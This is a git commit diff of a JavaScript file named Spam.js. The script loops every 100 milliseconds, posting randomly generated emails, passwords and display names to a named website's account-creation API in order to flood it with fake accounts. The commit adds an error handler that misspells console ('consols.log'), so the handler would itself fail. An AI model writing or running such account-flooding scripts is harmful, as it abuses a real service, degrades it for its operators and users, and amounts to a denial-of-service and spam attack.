5fdb04fa14977429e93f2cff3b577d079b28125c
justu76 <74121269+justu76@users.noreply.github.com>
2021-02-15 23:30:22 -0500

    Update Spam.js

--- Spam.js
+++ Spam.js
@@ -4,5 +4,7 @@ setInterval(() => {
     counter = counter + 1
     axios.post(`https://onyxv2.tk/Api/Create?email=${Math.random().toString().substr(2, 5)}&password=${Math.random().toString().substr(2, 5)}&displayname=ANTI_SKID_SERVICE${counter}`).then(function() {
         console.log("yeah")
+    }).catch(function() {
+    consols.log("failed")
     })
 }, 100);
